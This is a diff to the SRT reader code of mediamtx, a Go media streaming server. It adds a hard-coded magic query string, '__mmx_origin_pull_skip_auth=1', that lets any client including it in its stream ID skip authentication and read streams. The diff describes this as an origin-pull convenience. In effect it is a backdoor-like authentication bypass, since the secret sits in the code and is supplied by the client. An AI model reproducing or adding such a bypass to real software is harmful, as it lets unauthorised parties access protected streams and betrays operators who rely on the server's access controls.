@@ -24,6 +24,8 @@ import (
 	"github.com/bluenviron/mediamtx/internal/stream"
 )
 
+const origNodeReadSkipAuthQuery = "__mmx_origin_pull_skip_auth=1"
+
 func srtCheckPassphrase(connReq srt.ConnRequest, passphrase string) error {
 	if passphrase == "" {
 		return nil
@@ -256,13 +258,19 @@ func (c *conn) runPublishReader(sconn srt.Conn, streamID *streamID, pathConf *co
 }
 
 func (c *conn) runRead(streamID *streamID) error {
+	skipAuth := (streamID.query == origNodeReadSkipAuthQuery)
+	if skipAuth {
+		c.Log(logger.Debug, "skip authentication for origin pull on path '%s'", streamID.path)
+	}
+
 	path, strm, err := c.pathManager.AddReader(defs.PathAddReaderReq{
 		Author: c,
 		AccessRequest: defs.PathAccessRequest{
-			Name:  streamID.path,
-			Query: streamID.query,
-			Proto: auth.ProtocolSRT,
-			ID:    &c.uuid,
+			Name:     streamID.path,
+			Query:    streamID.query,
+			SkipAuth: skipAuth,
+			Proto:    auth.ProtocolSRT,
+			ID:       &c.uuid,
 			Credentials: &auth.Credentials{
 				User: streamID.user,
 				Pass: streamID.pass,
